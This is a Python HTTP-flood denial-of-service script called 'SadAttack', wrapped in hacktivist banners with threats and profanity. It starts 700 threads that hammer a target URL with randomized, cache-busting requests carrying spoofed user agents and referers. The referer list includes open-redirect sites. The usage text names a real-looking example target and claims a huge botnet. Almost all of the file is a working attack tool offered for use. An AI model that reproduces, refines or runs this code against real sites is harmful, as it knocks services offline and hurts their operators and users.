####################################->
#4312644bf54db17180c8a95add9fdc06####-->uauauauauauauau
#9dfb17e500b557a9d985c08da4fd0aaf#####--->We will fuck your site D:
#5afc3c0f68ff47b53b485fcd53e898a9######---->Anonymous :(
#ff46a6b3100d11c29d4233c72f604a10#####--->uauauauauauau
#6e70e3b1bf171ae14505f4f8b0dc4e5a####-->
####################################->
#https://www.youtube.com/watch?v=Aps4ZczffVw#
#Allahu Akbar!#


import urllib.request
import sys
import threading
import random
import re

# global params
url = ''
host = ''
headers_useragents = []
headers_referers = []
request_counter = 0
flag = 0
safe = 0

def inc_counter():
    global request_counter
    request_counter += 45

def set_flag(val):
    global flag
    flag = val

def set_safe():
    global safe
    safe = 1

# generates a user agent array
def useragent_list():
    global headers_useragents
    headers_useragents.extend([
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) BlackHawk/1.0.195.0 Chrome/127.0.0.1 Safari/62439616.534',
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
        'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
        'Mozilla/5.0 (PlayStation 4 1.52) AppleWebKit/536.26 (KHTML, like Gecko)',
        'Mozilla/5.0 (Windows NT 6.1; rv:26.0) Gecko/20100101 Firefox/26.0 IceDragon/26.0.0.2',
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
        'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
        'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
        'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51'
    ])
    return headers_useragents

# generates a referer array
def referer_list():
    global headers_referers
    headers_referers.extend([
        'http://www.google.com/?q=',
        'http://www.usatoday.com/search/results?q=',
        'http://engadget.search.aol.com/search?q=',
        'http://www.google.com/?q=',
        'http://www.usatoday.com/search/results?q=',
        'http://engadget.search.aol.com/search?q=',
        'http://www.bing.com/search?q=',
        'http://search.yahoo.com/search?p=',
        'http://www.ask.com/web?q=',
        'http://search.lycos.com/web/?q=',
        'http://busca.uol.com.br/web/?q=',
        'http://us.yhs4.search.yahoo.com/yhs/search?p=',
        'http://www.dmoz.org/search/search?q=',
        'http://www.baidu.com.br/s?usm=1&rn=100&wd=',
        'http://yandex.ru/yandsearch?text=',
        'http://www.zhongsou.com/third?w=',
        'http://hksearch.timway.com/search.php?query=',
        'http://find.ezilon.com/search.php?q=',
        'http://www.sogou.com/web?query=',
        'http://api.duckduckgo.com/html/?q=',
        'http://boorow.com/Pages/site_br_aspx?query=',
        'http://validator.w3.org/check?uri=',
        'http://validator.w3.org/checklink?uri=',
        'http://validator.w3.org/unicorn/check?ucn_task=conformance&ucn_uri=',
        'http://validator.w3.org/nu/?doc=',
        'http://validator.w3.org/mobile/check?docAddr=',
        'http://validator.w3.org/p3p/20020128/p3p.pl?uri=',
        'http://www.icap2014.com/cms/sites/all/modules/ckeditor_link/proxy.php?url=',
        'http://www.rssboard.org/rss-validator/check.cgi?url=',
        'http://www2.ogs.state.ny.us/help/urlstatusgo.html?url=',
        'http://prodvigator.bg/redirect.php?url=',
        'http://validator.w3.org/feed/check.cgi?url=',
        'http://www.ccm.edu/redirect/goto.asp?myURL=',
        'http://forum.buffed.de/redirect.php?url=',
        'http://rissa.kommune.no/engine/redirect.php?url=',
        'http://www.sadsong.net/redirect.php?url=',
        'https://www.fvsbank.com/redirect.php?url=',
        'http://www.jerrywho.de/?s=/redirect.php?url=',
        'http://www.inow.co.nz/redirect.php?url=',
        'http://www.automation-drive.com/redirect.php?url=',
        'http://mytinyfile.com/redirect.php?url=',
        'http://ruforum.mt5.com/redirect.php?url=',
        'http://www.websiteperformance.info/redirect.php?url=',
        'http://www.airberlin.com/site/redirect.php?url=',
        'http://www.rpz-ekhn.de/mail2date/ServiceCenter/redirect.php?url=',
        'http://evoec.com/review/redirect.php?url=',
        'http://www.crystalxp.net/redirect.php?url=',
        'http://watchmovies.cba.pl/articles/includes/redirect.php?url=',
        'http://www.seowizard.ir/redirect.php?url=',
        'http://apke.ru/redirect.php?url=',
        'http://seodrum.com/redirect.php?url=',
        'http://redrool.com/redirect.php?url=',
        'http://blog.eduzones.com/redirect.php?url=',
        'http://www.onlineseoreportcard.com/redirect.php?url=',
        'http://www.wickedfire.com/redirect.php?url=',
        'http://searchtoday.info/redirect.php?url=',
        'http://www.bobsoccer.ru/redirect.php?url=',
        'http://newsdiffs.org/article-history/iowaairs.org/redirect.php?url=',
        'http://seo.qalebfa.ir/%D8%B3%D8%A6%D9%88%DA%A9%D8%A7%D8%B1/redirect.php?url=',
        'http://www.firmia.cz/redirect.php?url=',
        'http://www.e39-forum.de/redir.php?url=',
        'http://www.wopus.org/wp-content/themes/begin/inc/go.php?url=',
        'http://www.selectsmart.com/plus/select.php?url=',
        'http://www.taichinh2a.com/forum/links.php?url=',
        'http://facenama.com/go.php?url=',
        'http://www.internet-abc.de/eltern/118732.php?url=',
        'http://g.makebd.com/index.php?url=',
        'https://blog.eduzones.com/redirect.php?url=',
        'http://www.mientay24h.vn/redirector.php?url=',
        'http://www.kapook.com/webout.php?url=',
        'http://lue4.ddns.name/pk/index.php?url=',
        'http://747.ddns.ms/pk/index.php?url=',
        'http://737.ddns.us/pk/index.php?url=',
        'http://a30.m1.4irc.com/pk/index.php?url='
    ])
    return headers_referers

# builds random ascii string
def buildblock(size):
    out_str = ''
    for _ in range(0, size):
        a = random.randint(65, 160)
        out_str += chr(a)
    return out_str

def usage():
    print('SadAttack Version 2.0 DDoS Tool Created By Hax Stroke and modified by Akira')
    print('AnonGhost Team Page: http://facebook.com/anonghost.sec')
    print('New loaded Botnets: 39,445,657')
    print('Usage: botnet_akira (url)')
    print('Example: botnet_akira http://luthi.co.il/')
    print("\a")
print("""                                                       
                                  ###################
                              ###!!!!!!!!!!!!!!!!!!!####
                          ###!!!!!!!!!!!!!!!!!!!!!!!!!####
                        ##!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!###     
                     ###!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!###
                   ##!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!###       
                  ##!!!!!!!!!#####!!!!!!!!!!!#####!!!!!!!!!##       
                ##!!!!!!!!!!######!!!!!!!!!!######!!!!!!!!!##       
               ##!!!!!!!!!!!####!!!!!!!!!!!!####!!!!!!!!!!!##       
              ##!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!##       
             ##!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!##
            ##!!!!!!!!!!!!!!!!!!!!####!!!!!!!!!!!!!!!!!!!!##
           ##!!!!!!!!!!!!!!!###############!!!!!!!!!!!!!!##
           ##!!!!!!!!!!!!####!!!!!!!!!!!#####!!!!!!!!!!!##
          ###!!!!!!!!!###!!!!!!!!!!!!!!!!!!##!!!!!!!!!!##
          ##!!!!!!!!!#!!!!!!!!!!!!!!!!!!!!!!##!!!!!!!!##
          ###!!!!!!#!!!!!!!!!!!!!!!!!!!!!!!!##!!!!!!!##
          ###!!!!!#!!!!!!!!!!!!!!!!!!!!!!!!!##!!!!!##
           ###!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!##
            ###!!!!!!!!!!!!!!!!!!!!!HAHA!!WEAREHERE##
             ###!!!!!!!!!!!!!!Anonymous!Team##
              ####!!!!!!!!!!!!!SadAttacK###
                ####!!!!!!!!!!!!!!!!!###
                   ################# 
_________________________________________________________________

  ################## Smoking loud I'm a lonely cloud
  #SadBoys 2001    # I'm a lonely cloud, with my windows down
  #Yoshi city      # I'm a lonely, lonely, I'm a lonely, lonely
  #Akira botnet    # I'm a lonely, lonely, I'm a lonely, lonely
  #Add Sites       # I'm a lonely, lonely, I'm a lonely, lonely
  ################## I'm a lonely, lonely, I'm a lonely, lonely

  Music : https://www.youtube.com/watch?v=iX1a3JngmpI   
_________________________________________________________________                                                           
""")

# http request
def httpcall(url):
    useragent_list()
    referer_list()
    code = 0
    param_joiner = "&" if "?" in url else "?"
    request = urllib.request.Request(url + param_joiner + buildblock(random.randint(3, 10)) + '=' + buildblock(random.randint(3, 10)))
    request.add_header('User-Agent', random.choice(headers_useragents))
    request.add_header('Cache-Control', 'no-cache')
    request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
    request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(50, 100)))
    request.add_header('Keep-Alive', str(random.randint(110, 160)))
    request.add_header('Connection', 'keep-alive')
    request.add_header('Host', host)
    try:
        urllib.request.urlopen(request)
    except urllib.error.HTTPError as e:
        set_flag(1)
        print('                                                                    ')
        print('#~~~~~~~> We Are Anonymous <~~~~~~~~#~~~>We Come For Opicarus<~~#')
        print('#~~~~~~> Killuminati <~~~~~#~~~~~~~~~>Hello Banks<~~~~~~~~#')
        print('#~~~~~~> Freedom <~~~~~~~#~~~~>You R Our Target<~~~~#')
        print('#~~~> WATCH THIS <~~~#~~~>DDOS<~~~#')
        print('                                                                    ')
        code = 500
    except urllib.error.URLError as e:
        sys.exit()
    else:
        inc_counter()
        urllib.request.urlopen(request)
    return code

# http caller thread 
class HTTPThread(threading.Thread):
    def run(self):
        try:
            while flag < 2:
                code = httpcall(url)
                if code == 500 and safe == 1:
                    set_flag(2)
        except Exception as ex:
            pass

# monitors http threads and counts requests
class MonitorThread(threading.Thread):
    def run(self):
        previous = request_counter
        while flag == 0:
            if previous + 150 < request_counter and previous != request_counter:
                print("#~~~>ATTACK THE INTERNET: %d Sending more<~~~#" % (request_counter))
                previous = request_counter
        if flag == 2:
            print("\n ~>Stopping the mass DDoS Attack<~")

# execute 
if len(sys.argv) < 2:
    usage()
    sys.exit()
else:
    if sys.argv[1] == "help":
        usage()
        sys.exit()
    else:
        print("Starting the Sadness in webserver Sad DDoS Tool")
        print("Created By Anonymous")
        print("Modified By Akira")
        if len(sys.argv) == 3 and sys.argv[2] == "safe":
            set_safe()
        url = sys.argv[1]
        if url.count("/") == 2:
            url = url + "/"
        m = re.search(r'http://([^/]*)/?.*', url)
        host = m.group(1)
        for i in range(700):
            t = HTTPThread()
            t.start()
        t = MonitorThread()
        t.start()


####################################->
#4312644bf54db17180c8a95add9fdc06####-->uauauauauauauau
#9dfb17e500b557a9d985c08da4fd0aaf#####--->We will fuck your site D:
#5afc3c0f68ff47b53b485fcd53e898a9######---->SadAttack :(
#ff46a6b3100d11c29d4233c72f604a10#####--->uauauauauauau
#6e70e3b1bf171ae14505f4f8b0dc4e5a####-->uRDead
####################################->ANONYMOUS
